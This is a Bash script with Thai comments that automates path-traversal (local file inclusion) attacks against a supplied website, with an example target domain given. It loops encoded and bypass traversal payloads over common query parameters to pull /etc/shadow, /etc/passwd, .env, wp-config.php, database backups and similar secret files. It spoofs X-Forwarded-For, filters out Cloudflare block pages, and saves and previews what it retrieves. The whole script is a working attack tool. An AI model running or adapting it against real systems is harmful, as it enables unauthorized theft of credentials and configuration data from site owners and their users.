#!/bin/bash

# File Download Tester - Sensitive File Extraction
# ทดสอบการดาวน์โหลดไฟล์สำคัญโดยใช้เทคนิค bypass ที่สำเร็จแล้ว

TARGET_URL="$1"

if [ -z "$TARGET_URL" ]; then
    echo "Usage: $0 <target_url>"
    echo "Example: $0 https://pakyok77.link"
    exit 1
fi

# ตรวจสอบ URL
if [[ ! "$TARGET_URL" =~ ^https?:// ]]; then
    TARGET_URL="https://$TARGET_URL"
fi

# สร้างโฟลเดอร์สำหรับเก็บไฟล์ที่ดาวน์โหลด
DOWNLOAD_DIR="downloaded_files_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$DOWNLOAD_DIR"

# ใช้ User-Agent ที่สำเร็จแล้ว
SUCCESSFUL_UA="Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36"

echo "[+] File Download Tester - Sensitive File Extraction"
echo "====================================================="
echo "Target: $TARGET_URL"
echo "Download Directory: $DOWNLOAD_DIR"
echo "User-Agent: $SUCCESSFUL_UA"
echo ""

# ไฟล์ที่ต้องการดาวน์โหลด
FILES=(
    "/etc/passwd"
    "/etc/shadow"
    "/etc/hosts"
    "/proc/version"
    "/proc/cpuinfo"
    "config.php"
    ".env"
    ".htaccess"
    "wp-config.php"
    "config.ini"
    "database.php"
    "db.php"
    "connection.php"
    "settings.php"
    "config.php.bak"
    ".env.bak"
    ".htaccess.bak"
    "backup.sql"
    "admin.php"
    "login.php"
)

# Endpoints ที่ใช้ทดสอบ
ENDPOINTS=(
    "index.php?page="
    "search?q="
    "file="
    "page="
    "include="
    "load="
    "view="
    "show="
    "display="
    "read="
)

# Path traversal payloads
LFI_PAYLOADS=(
    "../../../etc/passwd"
    "../../../../etc/passwd"
    "../../../../../etc/passwd"
    "../../../../../../etc/passwd"
    "../../../../../../../etc/passwd"
    "../../../../../../../../etc/passwd"
    "....//....//....//etc/passwd"
    "....//....//....//....//etc/passwd"
    "....//....//....//....//....//etc/passwd"
    "..%2F..%2F..%2Fetc%2Fpasswd"
    "..%252F..%252F..%252Fetc%252Fpasswd"
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
    "..%255c..%255c..%255cetc%255cpasswd"
    "..%5c..%5c..%5cetc%5cpasswd"
    "..%92..%92..%92etc%92passwd"
)

# ตัวแปรสำหรับเก็บผลลัพธ์
SUCCESS_COUNT=0
TOTAL_TESTS=0
SUCCESSFUL_DOWNLOADS=()

echo "[+] Starting file download tests..."
echo ""

# ทดสอบการดาวน์โหลดไฟล์
for file in "${FILES[@]}"; do
    echo "[*] Testing file: $file"
    
    for endpoint in "${ENDPOINTS[@]}"; do
        for payload in "${LFI_PAYLOADS[@]}"; do
            # แทนที่ etc/passwd ด้วยไฟล์ที่ต้องการ
            test_payload=$(echo "$payload" | sed "s|etc/passwd|$file|g")
            
            # สร้าง URL
            test_url="${TARGET_URL}/${endpoint}${test_payload}"
            
            # สร้างชื่อไฟล์สำหรับบันทึก
            safe_filename=$(echo "$file" | sed 's|/|_|g' | sed 's|\.|_|g')
            output_file="${DOWNLOAD_DIR}/${safe_filename}_${endpoint//[^a-zA-Z0-9]/_}.txt"
            
            echo "  Testing: $test_url"
            
            # ดาวน์โหลดไฟล์
            response=$(curl -s -w "%{http_code}" -o "$output_file" \
                -H "User-Agent: $SUCCESSFUL_UA" \
                -H "X-Forwarded-For: 127.0.0.1" \
                -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
                -H "Accept-Language: en-US,en;q=0.5" \
                -H "Accept-Encoding: gzip, deflate" \
                -H "Connection: keep-alive" \
                -H "Upgrade-Insecure-Requests: 1" \
                --connect-timeout 10 \
                --max-time 30 \
                "$test_url")
            
            http_code="${response: -3}"
            response_body="${response%???}"
            
            TOTAL_TESTS=$((TOTAL_TESTS + 1))
            
            # ตรวจสอบว่าดาวน์โหลดสำเร็จหรือไม่
            if [ "$http_code" = "200" ]; then
                file_size=$(stat -c%s "$output_file" 2>/dev/null || echo "0")
                
                if [ "$file_size" -gt 100 ]; then
                    # ตรวจสอบว่าไม่ใช่ Cloudflare block page
                    if ! grep -q "Cloudflare\|Attention Required\|403 Forbidden" "$output_file" 2>/dev/null; then
                        echo "  [+] SUCCESS: Downloaded $file (Size: ${file_size} bytes)"
                        echo "      URL: $test_url"
                        echo "      Saved: $output_file"
                        echo ""
                        
                        SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
                        SUCCESSFUL_DOWNLOADS+=("$file|$test_url|$output_file|$file_size")
                    else
                        echo "  [-] BLOCKED: Cloudflare protection detected"
                        rm -f "$output_file"
                    fi
                else
                    echo "  [-] FAILED: File too small or empty (${file_size} bytes)"
                    rm -f "$output_file"
                fi
            else
                echo "  [-] FAILED: HTTP $http_code"
                rm -f "$output_file"
            fi
        done
    done
    echo ""
done

# สรุปผลลัพธ์
echo "====================================================="
echo "[+] DOWNLOAD TEST SUMMARY"
echo "====================================================="
echo "Total Tests: $TOTAL_TESTS"
echo "Successful Downloads: $SUCCESS_COUNT"
echo "Success Rate: $(echo "scale=2; $SUCCESS_COUNT * 100 / $TOTAL_TESTS" | bc -l 2>/dev/null || echo "0")%"
echo ""

if [ $SUCCESS_COUNT -gt 0 ]; then
    echo "[+] SUCCESSFULLY DOWNLOADED FILES:"
    echo "====================================================="
    
    for download in "${SUCCESSFUL_DOWNLOADS[@]}"; do
        IFS='|' read -r file url output_file size <<< "$download"
        echo "File: $file"
        echo "URL: $url"
        echo "Saved: $output_file"
        echo "Size: ${size} bytes"
        echo "---"
    done
    
    echo ""
    echo "[+] DOWNLOADED FILES PREVIEW:"
    echo "====================================================="
    
    for download in "${SUCCESSFUL_DOWNLOADS[@]}"; do
        IFS='|' read -r file url output_file size <<< "$download"
        echo "=== $file ==="
        echo "File: $output_file (${size} bytes)"
        echo "Content Preview:"
        head -20 "$output_file" 2>/dev/null || echo "Cannot read file"
        echo ""
        echo "====================================================="
    done
    
    echo ""
    echo "[+] All downloaded files are saved in: $DOWNLOAD_DIR"
    echo "Use 'ls -la $DOWNLOAD_DIR' to view all files"
    echo "Use 'cat $DOWNLOAD_DIR/<filename>' to view specific files"
    
else
    echo "[-] No files were successfully downloaded."
    echo "[-] All attempts were blocked or failed."
fi

echo ""
echo "[+] Test completed at: $(date)"